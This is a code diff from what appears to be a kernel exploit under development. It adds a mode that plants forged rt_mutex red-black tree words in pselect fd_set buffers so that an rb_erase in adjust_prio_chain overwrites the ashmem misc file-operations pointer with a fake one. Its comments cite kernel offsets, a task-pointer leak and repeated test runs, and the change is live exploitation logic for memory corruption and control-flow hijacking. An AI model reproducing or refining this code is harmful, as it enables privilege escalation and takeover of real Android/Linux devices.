@@ -384,6 +384,25 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         g_pi_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + misc_off);
       }
       /*
+       * MODE4_JC2_MAIN=1 (roll 13): mirror the only-left swap geometry
+       * onto the GHOST'S MAIN TREE words {0,1,2}. The first rb_erase of
+       * the walk (0x1edddc, rt_mutex_dequeue(lock, waiter)) is the ONE
+       * erase slot with POSITIVE execution proof (rolls 7/10/12 ran it
+       * harmlessly with {0,0,0}). Case 2-left: store-1 *(misc.fops) =
+       * fake_fops (THE SWAP); change_child(parent=fake_fops) = our page;
+       * rebalance NULL (child-present). Post-erase requeue re-inserts
+       * the ghost cleanly (pc self-cleared by the walk at 0x1eddf0).
+       */
+      uint64_t g_main_pc = 0, g_main_left = 0;
+      if (env_flag("MODE4_JC2_MAIN", 0)) {
+        uint64_t misc_off =
+            (active_offsets && active_offsets->off_ashmem_misc_fops)
+                ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                : (uint64_t)ASHMEM_MISC_FOPS_OFF;
+        g_main_pc = (uint64_t)fake_fops;
+        g_main_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + misc_off);
+      }
+      /*
        * word6 (task): MUST be the waiter thread's own task — our 5.10
        * adjust_prio_chain exits at 0x1ed9e0 on waiter->task != task.
        * jc2_self_task_leak() runs HERE (on the waiter thread, pid=0
@@ -401,9 +420,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            * first fd-set qword" — at shift=0 ALL TEN words are stampable.
            * tree {0,0,0} = root-case dequeue (deterministic, harmless);
            * words 0/1 are NEVER left to the original linkage again. */
-          {0, 0, "tree_pc"},
+          {0, g_main_pc, "tree_pc"},
           {1, 0, "tree_right"},
-          {2, 0, "tree_left"},
+          {2, g_main_left, "tree_left"},
           {3, g_pi_parent, "pi_parent"},
           {4, 0, "pi_right"},
           {5, g_pi_left, "pi_left"},
